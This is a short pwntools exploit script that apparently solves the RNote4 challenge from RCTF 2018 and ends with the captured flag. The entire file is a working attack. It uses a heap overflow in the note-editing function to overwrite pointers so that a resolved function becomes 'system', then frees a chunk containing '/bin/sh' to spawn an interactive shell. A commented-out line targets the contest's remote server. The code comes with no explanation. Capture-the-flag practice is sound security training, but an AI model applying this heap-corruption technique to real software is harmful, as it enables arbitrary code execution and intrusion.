from pwn import *

s = process('./RNote4')
#s = remote('rnote4.2018.teamrois.cn',6767)

def alloc(size,data):
	s.send(p8(1))
	s.send(p8(size))
	s.send(data)

def edit(idx,size,data):
	s.send(p8(2))
	s.send(p8(idx))
	s.send(p8(size))
	s.send(data)

def free(idx):
	s.send(p8(3))
	s.send(p8(idx))

alloc(0x98,'A' * 0x98)
alloc(0x98,'A' * 0x98)
edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x601eb0))
edit(1,0x8,p64(0x602200))

edit(0,0xb0,'B' * 0x98 + p64(0x21) + p64(0x98) + p64(0x602200))
payload = 'A' * 0x5f + 'system\x00'
edit(1,len(payload),payload)

edit(0,0x8,'/bin/sh\x00')
free(0)

s.interactive()
# RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}
